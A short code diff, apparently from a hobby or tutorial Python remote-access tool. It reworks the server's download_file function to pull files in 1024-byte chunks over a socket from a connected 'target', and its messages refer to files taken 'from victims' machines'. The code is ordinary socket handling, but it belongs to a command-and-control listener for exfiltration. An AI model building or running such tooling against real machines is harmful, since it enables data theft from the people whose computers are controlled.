@@ -47,24 +47,31 @@ def upload_file(file_name):
 def download_file(file_name):
     # open file object 'f' using 
     # 'wb' => write bytes to a file
+    # ***
     f = open(file_name, 'wb')    
+    # ***
     # If timeout is NOT set, sometimes program will get stuck
     target.settimeout(1)
-    print(f'Starting to receive data of simple files...')
+    print(f'Starting to receive bytes in chunks from simple files...')
+    
     # Receive data from multiple chunks
-    chunk = target.recv(1024)
-    # As long as there's something in chunk variable
-    while chunk:
-        # Writing the chunk into file
-        f.write(chunk)
-        try:
+    try:
+        chunk = target.recv(1024)
+        # As long as there's something in chunk variable
+        while chunk:
+            # Writing the chunk into file
+            f.write(chunk)
+
+            print(f'Server is writing chunks of 1024 bytes of simple files from victims...')
             chunk = target.recv(1024)
         # If there's any errors => reached End of file
-        except socket.timeout as e:
-            break
+    except socket.timeout as e:
+        print(f'Server has no pending 1024-byte chunks in queue...\nExiting...\n')
+    finally:
         target.settimeout(None)
         # Close file upon complete sending files from victims
         f.close()
+        print(f'This server is closing open-file on victims\' machines')
     
 def target_communication():
     while True:
